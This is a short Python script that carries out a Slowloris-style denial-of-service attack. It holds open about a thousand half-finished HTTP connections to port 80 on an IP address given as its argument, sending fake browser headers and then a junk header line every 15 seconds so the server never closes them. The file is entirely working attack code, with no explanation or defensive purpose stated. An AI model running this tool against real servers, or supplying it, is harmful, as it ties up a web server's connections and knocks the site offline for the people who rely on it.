#!/usr/bin/env python

import socket, random, time, sys, colorama
from colorama import Fore

headers = [
    "User-agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Accept-language: en-US,en"
]

sockets = []

def setupSocket(ip):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(4)
    sock.connect((ip, 80))
    sock.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 1337)).encode("utf-8"))

    for header in headers:
        sock.send("{}\r\n".format(header).encode("utf-8"))

    return sock

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(Fore.RED+"Unknown Error"+Fore.WHITE)
        sys.exit()

    ip = sys.argv[1]
    count = 1020

    for _ in range(count):
        try:
            print(Fore.YELLOW+"Connecting Sockets {}".format(_))
            sock = setupSocket(ip)
        except socket.error:
            break

        sockets.append(sock)

    while True:
        print(Fore.GREEN+"Connected {} sockets".format(len(sockets)))

        for sock in list(sockets):
            try:
                sock.send("X-a: {}\r\n".format(random.randint(1, 4600)).encode("utf-8"))
            except socket.error:
                sockets.remove(sock)

        for _ in range(count - len(sockets)):
            try:
                sock = setupSocket(ip)
                if sock:
                    print(Fore.RED+"HIT!"+Fore.WHITE)
                    sockets.append(sock)
            except socket.error:
                break

        time.sleep(15)
